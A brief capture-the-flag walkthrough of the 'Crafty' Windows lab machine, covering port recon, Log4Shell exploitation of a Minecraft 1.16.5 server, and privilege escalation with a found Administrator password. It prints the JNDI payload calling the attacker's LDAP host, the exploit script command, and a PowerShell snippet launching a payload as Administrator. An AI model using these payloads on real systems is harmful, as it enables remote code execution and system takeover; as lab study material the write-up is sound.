## Crafty - Windows Machine


- [+]	Target Ip
   >>	10.10.11.249
   

## Recon 

- [1] PORT      STATE SERVICE
- [+] 80/tcp    open  http
- [+] 25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 2/100)


- [+]	Minecraft 1.16.5 vulnerable to log4j 

   >>	couple of github repos to setup ldap servers and to exploit log4j needs to inject the basic $jdni:ldap//ip/a 

   >>	problem was to find a minecraft server cuz there waas no way for me to install minecraft in my vm xD

   >>	found a repo on git 
            
        ```poc.py
            python3 poc.py --userip 10.10.16.77 --webport 8000 --lport 9001 ## add ur tun0 ip instead of localhost  
            [+] Send me: ${jndi:ldap://10.10.16.77:1389/a}
            ```
            
        ```mcli 
            ./mcli whitenight '' 10.10.11.249
            /send ${jndi:ldap://10.10.16.77:1389/a}
            ```
## Privesc

- [+]	Plugin files shows a password for rcon , which didnt work for me earlier 
        ```powershell
        $user = 'Administrator'
        $pass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
        $creds = New-Object System.Management.Automation.PSCredential($user,$pass)
        Start-Process -FilePath "C:\Users\svc_minecraft\AppData\Local\Temp\priv.exe" -Credential $creds
        ```
